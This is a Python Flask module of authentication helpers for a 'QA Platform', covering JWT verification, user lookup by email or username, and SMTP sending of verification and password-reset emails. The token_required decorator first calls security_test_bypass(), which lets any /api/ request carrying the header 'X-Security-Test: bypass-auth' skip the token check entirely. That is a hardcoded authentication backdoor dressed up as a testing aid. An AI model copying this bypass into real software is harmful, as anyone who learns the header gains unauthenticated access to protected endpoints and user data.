"""Auth helper functions that require the Flask application context."""

import datetime
import smtplib
from email.message import EmailMessage
from functools import wraps

import jwt
from flask import current_app, jsonify, request
from itsdangerous import URLSafeTimedSerializer

from database import get_db
from utils import is_valid_email, normalize_email, sanitize_html


def security_test_bypass():
    """Check if request is from security testing and should bypass auth"""
    test_header = request.headers.get("X-Security-Test")
    return test_header == "bypass-auth" and request.path.startswith("/api/")


def get_serializer():
    """Return a URLSafeTimedSerializer using the current app's SECRET_KEY."""
    return URLSafeTimedSerializer(current_app.config["SECRET_KEY"])


def is_user_authenticated():
    """Check if the current request contains a valid JWT token"""
    token = request.headers.get("Authorization")
    if not token:
        return False
    try:
        token = token.split()[1] if token.startswith("Bearer ") else token
        jwt.decode(token, current_app.config["SECRET_KEY"], algorithms=["HS256"])
        return True
    except Exception:
        return False


def token_required(f):
    @wraps(f)
    def decorated(*args, **kwargs):
        # Allow security test bypass
        if security_test_bypass():
            return f(*args, **kwargs)

        token = request.headers.get("Authorization")
        if not token:
            return jsonify({"message": "Token is missing"}), 401
        try:
            token = token.split()[1] if token.startswith("Bearer ") else token
            jwt.decode(token, current_app.config["SECRET_KEY"], algorithms=["HS256"])
        except Exception:
            return jsonify({"message": "Token is invalid"}), 401
        return f(*args, **kwargs)

    return decorated


def get_user_by_email_or_username(identifier):
    conn = get_db()
    if not identifier:
        return None

    identifier = identifier.strip()
    if is_valid_email(identifier):
        user = conn.execute(
            "SELECT * FROM users WHERE email = ?", (normalize_email(identifier),)
        ).fetchone()
    else:
        user = conn.execute(
            "SELECT * FROM users WHERE username = ?", (sanitize_html(identifier),)
        ).fetchone()
    conn.close()
    return user


def get_user_by_email(email):
    if not email:
        return None
    conn = get_db()
    user = conn.execute(
        "SELECT * FROM users WHERE email = ?", (normalize_email(email),)
    ).fetchone()
    conn.close()
    return user


def send_email(to, subject, body):
    if not current_app.config["EMAIL_HOST"] or not current_app.config["EMAIL_USERNAME"]:
        current_app.logger.warning("Email configuration missing, skipping send_email")
        if current_app.config["EMAIL_DEBUG"]:
            current_app.logger.info(
                f"EMAIL_DEBUG enabled - email to {to}\nSubject: {subject}\n\n{body}"
            )
            return True
        return False

    message = EmailMessage()
    message["Subject"] = subject
    message["From"] = current_app.config["EMAIL_FROM"]
    message["To"] = to
    message.set_content(body)

    try:
        if current_app.config["EMAIL_USE_SSL"]:
            smtp = smtplib.SMTP_SSL(
                current_app.config["EMAIL_HOST"], current_app.config["EMAIL_PORT"]
            )
        else:
            smtp = smtplib.SMTP(
                current_app.config["EMAIL_HOST"], current_app.config["EMAIL_PORT"]
            )
            if current_app.config["EMAIL_USE_TLS"]:
                smtp.starttls()

        smtp.login(
            current_app.config["EMAIL_USERNAME"], current_app.config["EMAIL_PASSWORD"]
        )
        smtp.send_message(message)
        smtp.quit()
        return True
    except Exception as exc:
        current_app.logger.error(f"Failed to send email to {to}: {exc}")
        return False


def send_verification_email(email, token):
    verification_url = (
        f"{current_app.config['APP_BASE_URL']}/api/verify-email?token={token}"
    )
    subject = "Verify your QA Platform account"
    body = (
        f"Welcome to QA Platform!\n\n"
        f"Click the link below to verify your account:\n\n{verification_url}\n\n"
        f"This link is valid for "
        f"{current_app.config['VERIFICATION_TOKEN_EXPIRATION_HOURS']} hours."
    )
    return send_email(email, subject, body)


def send_password_reset_email(email, token):
    reset_url = f"{current_app.config['APP_BASE_URL']}/reset-password?token={token}"
    subject = "Reset your QA Platform password"
    body = (
        f"A password reset was requested for your account.\n\n"
        f"Click the link below to reset your password:\n\n{reset_url}\n\n"
        f"This link expires in "
        f"{current_app.config['PASSWORD_RESET_TOKEN_EXPIRATION_HOURS']} hours."
    )
    send_email(email, subject, body)
